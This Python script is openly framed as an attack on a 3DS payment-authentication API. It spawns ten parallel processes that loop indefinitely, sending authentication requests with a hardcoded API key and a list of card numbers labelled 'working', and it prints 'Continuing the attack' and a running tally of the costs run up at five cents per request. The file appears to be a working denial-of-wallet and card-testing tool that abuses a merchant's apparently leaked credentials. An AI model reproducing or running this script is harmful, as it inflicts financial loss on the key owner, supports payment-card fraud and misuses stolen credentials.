#!/usr/bin/env python
# All who sin apart from the law will also perish apart from the law,
# and all who sin under the law will be judged by the law.
# Romans 2:12
from multiprocessing import Process
from traceback import print_exc
from requests import post, get
from time import sleep
import json

API_KEY = "0f5e374c375285bbef8a62914309f18e"

working = {
	"InterestingVisa1": "4532699062680770",
	"InterestingVisa2": "4916471526992670",
	"M1": "5165531056143880",
	"M2": "5196333328537590",
	"M3": "5472604991544930",
	"M4": "5599742522079170"
}

def requests():
	req_count = 0
	do_auth = True
	AUTHORIZE_URL = "https://api.3dsintegrator.com/v2/authorize"
	REQUEST_URL = "https://api.3dsintegrator.com/v2/authenticate/browser"
	RESULT_URL = "https://api.3dsintegrator.com/v2/transaction/{}/updates"
	AMEX = "376679044357470"
	MASTERCARD = "5165531056143880"
	OTHER = working['M1']

	auth_header = { # Working
					"accept": "application/json",
					"content-type": "application/json",
					"x-3ds-api-key": API_KEY,
					"x-3ds-sdk-version": "2.1.0.20210929"
				}

	card_header = { # Working
						"accept": "application/json",
						"X-3DS-API-KEY": API_KEY,
						"Content-Type": "application/json",
						"x-3ds-sdk-version": "2.1.0.20210929"
					}

	card_data = { # Working
					"browser": {
						"browserJavaEnabled": False,
						"browserJavaScriptEnabled": False,
						"browserLanguage": "en-US",
						"browserColorDepth": "24",
						"browserUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36",
						"browserAcceptHeader": "application/json",
						"browserScreenWidth": "1920",
						"browserScreenHeight": "1080",
						"browserTZ": "240"
					},
					"challengeIndicator": "02",
					"challengeWindowSize": "01",
					"transactionForcedTimeout": "20",
					"authenticationInd": "01",
					"amount": 3.37,
					"month": "03",
					"year": "27",
					"pan": OTHER,
					"protocolVersion": "2.1.0",
					"transType": "01",
					"threeDSRequestorURL": "https://ipad1.bigbangprizes.com/checkout"
				}

	try:
		while True:
			if do_auth:
				try:
					authorization = post(AUTHORIZE_URL, headers=auth_header).headers["Authorization"]
					# print(authorization)
					card_header["Authorization"] = authorization
				except:
					print("Failed to authenticate. Waiting for 10 seconds...")
					sleep(10)
					continue
				else:
					print("Authorized successfully. Continuing the attack...")
					do_auth = False

			transaction = post(REQUEST_URL, headers=card_header, json=card_data)
			if transaction.status_code == 201:
				req_count+= 1
				transactionId = transaction.json()["transactionId"]
				result = get(RESULT_URL.format(transactionId), headers=card_header)
				data = result.json()
				print(f"ID: {transactionId}, Status: {'Unsuccessful' if data['status'] == 'N' else 'Successful'}, Reason: {data['transStatusReasonDetail']}, HTTP Response: {result.status_code}")
			elif transaction.status_code == 403:
				print("Transaction forbidden. Reauthenticating...")
				do_auth = True
			else:
				print(f"Unhandled status code: {transaction.status_code}. Reauthenticating...")
				do_auth = True
			sleep(1)
	except Exception as e:
		print_exc()
		print(f"\n{e}\n\n[*] Exiting...")

	exit(req_count)

def main():
	# requests()
	workers = []
	count = 0
	for i in range(10):
		workers.append(Process(target=requests))
	for worker in workers:
		worker.start()
	try:
		for worker in workers:
			worker.join()
	except:
		pass
	for worker in workers:
		count+= worker.exitcode

	print(f"\n[*] Total requests: {count}\n[*] Expected costs: ${count*0.05}")

if __name__ == "__main__":
	main()
